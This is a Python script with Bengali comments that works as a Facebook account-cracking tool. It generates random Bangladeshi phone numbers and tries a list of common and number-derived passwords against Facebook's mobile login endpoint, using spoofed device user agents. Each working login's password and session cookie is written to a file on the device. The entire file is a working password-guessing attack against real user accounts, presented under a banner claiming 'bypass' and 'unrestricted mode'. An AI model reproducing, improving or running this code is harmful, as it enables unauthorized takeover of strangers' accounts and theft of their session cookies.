import os, time, sys, uuid, random, requests

# প্রফেশনাল ইউজার এজেন্ট পুল (বড় বড় ডিভাইসের জন্য)
def get_ua():
    android_version = random.randint(10, 14)
    models = ['SM-S918B', 'SM-A546B', 'Pixel 8 Pro', 'iPhone 15,3', 'SM-G998B', 'SM-A528B', 'SM-N986B']
    model = random.choice(models)
    return f"Mozilla/5.0 (Linux; Android {android_version}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"

def banner():
    os.system('clear')
    print(f"""\033[1;32m
     ███    ███  ███████  ████████  █████  
     ████  ████  ██          ██    ██   ██ 
     ██ ████ ██  █████       ██    ███████ 
     ██  ██  ██  ██          ██    ██   ██ 
     ██      ██  ███████     ██    ██   ██ 
\033[1;37m×××××××××××××××××××××××××××××××××××××××××××××××××
\033[1;32m [✓] CREATED BY : MD MALEK ISLAM (META REAL)
 [✓] METHOD     : CYBER BYPASS LOGIC (v4.0)
 [✓] STATUS     : UNRESTRICTED MODE ACTIVE
\033[1;37m×××××××××××××××××××××××××××××××××××××××××××××××××""")

def cloning():
    banner()
    code = input('\033[1;32m[+] SIM CODE (018, 019, 017, 013): \033[1;37m')
    limit = int(input('\033[1;32m[+] LIMIT: \033[1;37m'))
    
    banner()
    print('\033[1;32m[+] TARGET: HIGH-SPEED BYPASS')
    print('[+] STATUS: RUNNING DEEP SCAN')
    print('\033[1;37m×××××××××××××××××××××××××××××××××××××××××××××××××\n')
    
    ok, cp, loop = 0, 0, 0
    
    for _ in range(limit):
        loop += 1
        uid = f"{code}{random.randint(1111111, 9999999)}"
        
        # স্যারের 'কারিশমা' আর আমার 'বুদ্ধি' দিয়ে তৈরি বড় পাসওয়ার্ড লিস্ট
        pws = [
            uid, uid[4:], uid[5:], # নাম্বারের অংশ
            f'bangladesh{uid[7:]}', f'Bangladesh{uid[7:]}', # নাম্বারের সাথে বড় পাসওয়ার্ড
            '786786786', '1122334455', '9988776655', # বড় সিকোয়েন্স
            'i love you', 'i love you so much', 'I Love You', # ইমোশনাল বড় পাসওয়ার্ড
            'bangladesh@#', 'freefire123', 'pubgmobile', # গেম ও ট্রেন্ডিং
            f'{code}{code}@@', f'1020304050', f'5566778899' # ইউনিক বড় পাসওয়ার্ড
        ]
        
        for pw in pws:
            if len(pw) < 6: continue 
            
            headers = {
                'authority': 'm.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://m.facebook.com',
                'referer': 'https://m.facebook.com/login/',
                'user-agent': get_ua(),
            }

            data = {'lsd': uuid.uuid4().hex, 'jazoest': '2'+str(random.randint(1000, 9999)), 'email': uid, 'pass': pw}
            
            sys.stdout.write(f'\r\033[1;32m[MALEK-BYPASS] {loop}/{limit} [OK:{ok}]'); sys.stdout.flush()

            try:
                # স্যারের বাইপাস মেথড: সরাসরি ডিভাইস-বেজড লগইন
                res = requests.post("https://m.facebook.com/login/device-based/regular/login/", headers=headers, data=data, allow_redirects=False, timeout=15)
                if "c_user" in res.cookies.get_dict():
                    ok += 1
                    cookie = ";".join([f"{k}={v}" for k, v in res.cookies.get_dict().items()])
                    print(f'\n\033[1;32m[OK💚] {uid} | {pw}\n[🍪] COOKIE: {cookie}')
                    # ফাইল সেভ করার ব্যবস্থা (অবশ্যই পারমিশন অন থাকতে হবে)
                    open('/sdcard/MALEK-OK.txt', 'a').write(f'{uid}|{pw}|{cookie}\n')
                    break 
                elif "checkpoint" in res.cookies.get_dict():
                    cp += 1
                    break
            except: time.sleep(1)

if __name__ == "__main__": cloning()
Sen
